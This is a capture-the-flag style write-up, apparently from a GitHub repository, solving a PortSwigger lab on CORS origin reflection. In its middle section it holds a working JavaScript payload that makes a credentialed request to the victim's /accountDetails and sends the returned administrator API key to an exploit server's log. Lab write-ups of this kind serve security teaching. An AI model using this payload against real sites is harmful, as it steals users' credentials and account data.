# CORS : It stands for Cross Origin Resource sharing. It's browser security feature that decides wheather one websites is allowed to access data from another website. 

# 1. CORS vulnerability with basic origin reflection : 

<img width="743" height="194" alt="image" src="https://github.com/user-attachments/assets/db1c788a-1ac5-49b9-aa75-f0b3063c2d4f" />

# Goal : To craft some js that uses CORS to retrive administrator API key and upload to exploit server. 

# Ingrediants : exploit server, submit solution, home, my-account and view details button. 

<img width="1221" height="604" alt="image" src="https://github.com/user-attachments/assets/0a612ec9-c40a-48df-a2a2-0aa68d376874" />

# Solving : 

- Let's login

<img width="1246" height="523" alt="image" src="https://github.com/user-attachments/assets/981a7776-de0d-4b3e-a7b5-3743497a8e4f" />

- Let's see the request and response of the get request and will add a random website in the origin and see if the application accepts it.

<img width="1002" height="364" alt="image" src="https://github.com/user-attachments/assets/a02da2e5-6eca-4894-8b0f-b99743357187" />

- Hence we can see application allows orbitary origin.

- Now we will write a script that will fetch the api key of the admin users.

<html>
<body>
<script>
 var xhr = new XMLHttpRequest();
var url = "https://0a0c00d603efc10f86e77b4a007b0086.web-security-academy.net"

xhr.onreadystatechange = function() {
if(xhr.readyState==XMLHttpRequest.DONE){
fetch("/log?key=" + xhr.responseText)
}
}
xhr.open('GET', url + "/accountDetails", true);
xhr.withCredentials =true;
xhr.send(null)

</script>
</body>
</html>

- It creates a request to /accountDetails and sends user cookies with the request (withCredentials = true) and it waits until the server sends back the response
- And it reads the response and send it to /log?key=.

<img width="1175" height="516" alt="image" src="https://github.com/user-attachments/assets/525ff3cb-cd2e-4cf7-9964-cc9fda1487dc" />

- We can see we got the key from the access log. 

<img width="1359" height="541" alt="image" src="https://github.com/user-attachments/assets/339a8e42-3af6-4b7f-8504-a2a96d1c53d1" />

<img width="1126" height="591" alt="image" src="https://github.com/user-attachments/assets/cd4672e0-f22d-479e-97c7-616b062d46c2" />

- Hence by submitting the key we solve the lab. 

<img width="1215" height="540" alt="image" src="https://github.com/user-attachments/assets/8caac09d-fdb7-44b4-bdf1-8c3080cc88c6" />












# ------------------------------------------------------------------------------
